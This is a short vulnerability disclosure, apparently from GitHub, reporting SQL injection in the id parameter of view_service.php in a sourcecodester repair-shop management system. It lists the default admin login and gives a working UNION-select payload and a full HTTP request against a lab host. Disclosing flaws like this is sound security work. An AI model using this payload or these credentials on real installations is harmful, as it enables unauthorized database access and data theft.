# Computer and Mobile Repair Shop Management System v1.0 by sourcecodester has SQL injection 5

BUG_Author: huliangjia

Login account: admin/admin123

vendors: https://www.sourcecodester.com/php/15108/computer-and-mobile-repair-shop-management-system-using-phpoop-free-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /rsms/admin/services/view_service.php

Vulnerability location: /rsms/admin/services/view_service.php?id=, id

dbname = rsms_db

[+] Payload: /rsms/admin/services/view_service.php?id=-1%27%20union%20select%201,database(),3,4,5,6,7--+ // Leak place ---> id

```sql
GET /rsms/admin/services/view_service.php?id=-1%27%20union%20select%201,database(),3,4,5,6,7--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=4hcq3m63vjesdu2erm1nagcu37
Connection: close


```

<img width="1007" height="586" alt="image" src="https://github.com/user-attachments/assets/c68e85d5-7335-4272-b783-41b9d61dc5b0" />
